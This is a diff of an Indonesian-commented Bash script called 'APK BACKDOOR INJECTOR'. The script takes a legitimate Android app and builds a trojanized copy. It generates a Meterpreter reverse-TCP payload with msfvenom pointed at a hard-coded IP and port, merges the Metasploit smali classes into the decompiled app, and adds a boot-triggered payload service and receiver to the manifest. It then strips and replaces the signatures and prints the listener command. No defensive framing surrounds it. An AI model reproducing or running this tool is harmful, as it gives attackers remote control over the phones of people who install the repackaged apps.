@@ -1,149 +1,137 @@
 #!/bin/bash
 
 # =============================================
-# APK BACKDOOR INJECTOR - OPTIMIZED VERSION
+# APK BACKDOOR INJECTOR - FIXED VERSION
 # =============================================
 
-# --- KONFIGURASI WAJIB ---
-APK_INPUT="${1:-original.apk}"  # Bisa pakai argumen atau default
-LHOST="8.215.192.205"           # IP server Anda (WAJIB diubah jika berbeda)
-LPORT="4444"                    # Port listener
-OUTPUT_SUFFIX="_injected"       # Format nama output
-
-# --- KONFIGURASI TEKNIS ---
+# --- KONFIGURASI ---
+APK_INPUT="${1:-original.apk}"
+LHOST="8.215.192.205"
+LPORT="4444"
 WORKDIR=$(mktemp -d -p "$(pwd)" apk_work_XXXXXX)
 TOOL_DIR="$HOME/.apk_tools"
 LOG_FILE="apk_mod_$(date +%Y%m%d_%H%M%S).log"
 KEYSTORE="$TOOL_DIR/debug.keystore"
-APK_OUTPUT="${APK_INPUT%.*}${OUTPUT_SUFFIX}.apk"
+APK_OUTPUT="${APK_INPUT%.*}_injected.apk"
 
-# --- FUNGSI UTAMA ---
+# --- FUNGSI PERBAIKAN ---
 
-validasi_environment() {
-    echo "[*] Memvalidasi environment..." | tee -a "$LOG_FILE"
-    
-    # Cek konektivitas IP:PORT
-    echo "[*] Mengecek koneksi ke $LHOST:$LPORT..." | tee -a "$LOG_FILE"
-    if ! nc -zvw 3 "$LHOST" "$LPORT" &>> "$LOG_FILE"; then
-        echo "[!] Peringatan: Tidak bisa terkoneksi ke $LHOST:$LPORT" | tee -a "$LOG_FILE"
-        read -p "Lanjutkan tanpa tes koneksi? (y/n) " -n 1 -r
-        echo
-        [[ ! $REPLY =~ ^[Yy]$ ]] && exit 1
-    fi
-
-    # Cek file APK
-    if [ ! -f "$APK_INPUT" ]; then
-        echo "[X] File APK tidak ditemukan: $APK_INPUT" | tee -a "$LOG_FILE"
+install_aapt() {
+    echo "[*] Menginstall aapt..." | tee -a "$LOG_FILE"
+    sudo apt-get install -y aapt aapt2 android-framework-res >> "$LOG_FILE" 2>&1 || {
+        echo "[X] Gagal menginstall aapt" | tee -a "$LOG_FILE"
         exit 1
-    fi
+    }
+}
 
-    # Cek tools esensial
-    declare -A REQUIRED_TOOLS=(
-        ["apktool"]=""
-        ["msfvenom"]=""
-        ["jarsigner"]=""
-        ["zipalign"]=""
-        ["keytool"]=""
-    )
-
-    for tool in "${!REQUIRED_TOOLS[@]}"; do
-        if ! command -v "$tool" &>> "$LOG_FILE"; then
-            echo "[X] Tool '$tool' tidak terinstall" | tee -a "$LOG_FILE"
-            exit 1
-        fi
-    done
+fix_apktool() {
+    echo "[*] Memperbaiki framework apktool..." | tee -a "$LOG_FILE"
+    apktool empty-framework-dir --force >> "$LOG_FILE" 2>&1
+    apktool if /usr/share/android-framework-res/framework-res.apk >> "$LOG_FILE" 2>&1
 }
 
 setup_keystore() {
-    echo "[*] Menyiapkan keystore..." | tee -a "$LOG_FILE"
+    echo "[*] Membuat keystore..." | tee -a "$LOG_FILE"
+    mkdir -p "$TOOL_DIR"
     
-    if [ ! -f "$KEYSTORE" ]; then
-        keytool -genkey -v -keystore "$KEYSTORE" \
-        -alias androiddebugkey -storepass android -keypass android \
-        -keyalg RSA -keysize 4096 -validity 10000 \
-        -dname "CN=Android Debug,O=Android,C=US" &>> "$LOG_FILE"
-    fi
+    keytool -genkey -v -keystore "$KEYSTORE" \
+    -alias androiddebugkey -storepass android -keypass android \
+    -keyalg RSA -keysize 4096 -validity 10000 \
+    -dname "CN=Android Debug,O=Android,C=US" >> "$LOG_FILE" 2>&1 || {
+        echo "[X] Gagal membuat keystore" | tee -a "$LOG_FILE"
+        exit 1
+    }
 }
 
-handle_protected_apk() {
-    echo "[*] Memeriksa proteksi APK..." | tee -a "$LOG_FILE"
+handle_complex_apk() {
+    echo "[*] Menangani APK kompleks..." | tee -a "$LOG_FILE"
     
-    # Hapus signature lama
-    echo "[*] Menghapus signature lama..." | tee -a "$LOG_FILE"
-    zip -d "$APK_INPUT" 'META-INF/*.SF' 'META-INF/*.RSA' 'META-INF/*.DSA' &>> "$LOG_FILE"
+    # 1. Hapus signature lama
+    zip -d "$APK_INPUT" 'META-INF/*.SF' 'META-INF/*.RSA' 'META-INF/*.DSA' >> "$LOG_FILE" 2>&1
     
-    # Cek native library
-    if unzip -l "$APK_INPUT" | grep -q 'lib/.*\.so'; then
-        echo "[!] APK mengandung native library (.so)" | tee -a "$LOG_FILE"
-    fi
+    # 2. Dekompilasi tanpa resource
+    apktool d -r -s -f "$APK_INPUT" -o "$WORKDIR/original" >> "$LOG_FILE" 2>&1 || {
+        echo "[X] Gagal mendekompilasi APK" | tee -a "$LOG_FILE"
+        exit 1
+    }
 }
 
-inject_payload() {
-    echo "[*] Menyuntikkan payload..." | tee -a "$LOG_FILE"
+build_repaired_apk() {
+    echo "[*] Membangun APK (metode perbaikan)..." | tee -a "$LOG_FILE"
     
-    # 1. Buat payload
-    msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
-    -o "$WORKDIR/payload.apk" &>> "$LOG_FILE"
+    # 1. Build tanpa kompresi resource
+    apktool b --use-aapt2 "$WORKDIR/original" -o "$WORKDIR/unsigned.apk" >> "$LOG_FILE" 2>&1 || {
+        echo "[!] Gagal build dengan aapt2, mencoba metode alternatif..." | tee -a "$LOG_FILE"
+        
+        # Fallback: Build dengan opsi minimal
+        apktool b --use-aapt2 -c "$WORKDIR/original" -o "$WORKDIR/unsigned.apk" >> "$LOG_FILE" 2>&1 || {
+            echo "[X] Gagal membangun APK" | tee -a "$LOG_FILE"
+            exit 1
+        }
+    }
     
-    # 2. Dekompilasi kedua APK
-    apktool d -f "$APK_INPUT" -o "$WORKDIR/original" &>> "$LOG_FILE"
-    apktool d -f "$WORKDIR/payload.apk" -o "$WORKDIR/payload" &>> "$LOG_FILE"
-    
-    # 3. Gabungkan smali
-    cp -r "$WORKDIR/payload/smali/com/metasploit" "$WORKDIR/original/smali/com/" &>> "$LOG_FILE"
-    
-    # 4. Modifikasi Manifest
-    MANIFEST="$WORKDIR/original/AndroidManifest.xml"
-    sed -i '/<application/i \
-    <uses-permission android:name="android.permission.INTERNET"/> \
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>' "$MANIFEST"
-    
-    sed -i '/<\/application>/i \
-    <service android:name="com.metasploit.stage.PayloadService" \
-        android:exported="false" \
-        android:permission="android.permission.BIND_JOB_SERVICE"/> \
-    <receiver android:name="com.metasploit.stage.PayloadReceiver" \
-        android:exported="false"> \
-        <intent-filter> \
-            <action android:name="android.intent.action.BOOT_COMPLETED"/> \
-        </intent-filter> \
-    </receiver>' "$MANIFEST"
-}
-
-build_apk() {
-    echo "[*] Membangun APK..." | tee -a "$LOG_FILE"
-    
-    # 1. Rebuild
-    apktool b "$WORKDIR/original" -o "$WORKDIR/unsigned.apk" &>> "$LOG_FILE"
-    
-    # 2. Signing
+    # 2. Signing dengan verifikasi
     jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
     -keystore "$KEYSTORE" -storepass android -keypass android \
-    "$WORKDIR/unsigned.apk" androiddebugkey &>> "$LOG_FILE"
+    "$WORKDIR/unsigned.apk" androiddebugkey >> "$LOG_FILE" 2>&1 || {
+        echo "[X] Gagal menandatangani APK" | tee -a "$LOG_FILE"
+        exit 1
+    }
     
-    # 3. Zipalign
-    zipalign -v 4 "$WORKDIR/unsigned.apk" "$APK_OUTPUT" &>> "$LOG_FILE"
+    # 3. Zipalign dengan cek integritas
+    zipalign -c -v 4 "$WORKDIR/unsigned.apk" >> "$LOG_FILE" 2>&1 && \
+    zipalign -f -v 4 "$WORKDIR/unsigned.apk" "$APK_OUTPUT" >> "$LOG_FILE" 2>&1 || {
+        echo "[X] Gagal melakukan zipalign" | tee -a "$LOG_FILE"
+        exit 1
+    }
 }
 
 # --- EKSEKUSI UTAMA ---
-clear
-echo "=== APK BACKDOOR INJECTOR ===" | tee -a "$LOG_FILE"
-echo "LHOST: $LHOST" | tee -a "$LOG_FILE"
-echo "LPORT: $LPORT" | tee -a "$LOG_FILE"
-echo "Log File: $LOG_FILE" | tee -a "$LOG_FILE"
+echo "=== APK INJECTOR DIPERBAIKI ===" | tee -a "$LOG_FILE"
+echo "[*] LHOST: $LHOST" | tee -a "$LOG_FILE"
+echo "[*] LPORT: $LPORT" | tee -a "$LOG_FILE"
 
-# Validasi awal
-validasi_environment
+# Langkah perbaikan
+install_aapt
+fix_apktool
 setup_keystore
 
-# Proses utama
-handle_protected_apk
-inject_payload
-build_apk
+# Proses modifikasi
+handle_complex_apk
 
-# Hasil akhir
-echo "[+] Selesai! APK termodifikasi: $APK_OUTPUT" | tee -a "$LOG_FILE"
-echo "[*] Untuk menjalankan listener, gunakan perintah berikut:" | tee -a "$LOG_FILE"
+# Inject payload (sama seperti sebelumnya)
+echo "[*] Menyuntikkan payload..." | tee -a "$LOG_FILE"
+msfvenom -p android/meterpreter/reverse_tcp LHOST="$LHOST" LPORT="$LPORT" \
+-o "$WORKDIR/payload.apk" >> "$LOG_FILE" 2>&1 || {
+    echo "[X] Gagal membuat payload" | tee -a "$LOG_FILE"
+    exit 1
+}
+
+apktool d -f "$WORKDIR/payload.apk" -o "$WORKDIR/payload" >> "$LOG_FILE" 2>&1
+cp -r "$WORKDIR/payload/smali/com/metasploit" "$WORKDIR/original/smali/com/" >> "$LOG_FILE" 2>&1
+
+# Modifikasi Manifest
+sed -i '/<application/i \
+<uses-permission android:name="android.permission.INTERNET"/> \
+<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>' \
+"$WORKDIR/original/AndroidManifest.xml"
+
+sed -i '/<\/application>/i \
+<service android:name="com.metasploit.stage.PayloadService" \
+    android:exported="false" \
+    android:permission="android.permission.BIND_JOB_SERVICE"/> \
+<receiver android:name="com.metasploit.stage.PayloadReceiver" \
+    android:exported="false"> \
+    <intent-filter> \
+        <action android:name="android.intent.action.BOOT_COMPLETED"/> \
+    </intent-filter> \
+</receiver>' "$WORKDIR/original/AndroidManifest.xml"
+
+# Build final
+build_repaired_apk
+
+echo "[+] Berhasil dibangun: $APK_OUTPUT" | tee -a "$LOG_FILE"
+echo "[*] Listener command:" | tee -a "$LOG_FILE"
 echo "msfconsole -q -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; run'" | tee -a "$LOG_FILE"
 
 # Bersihkan
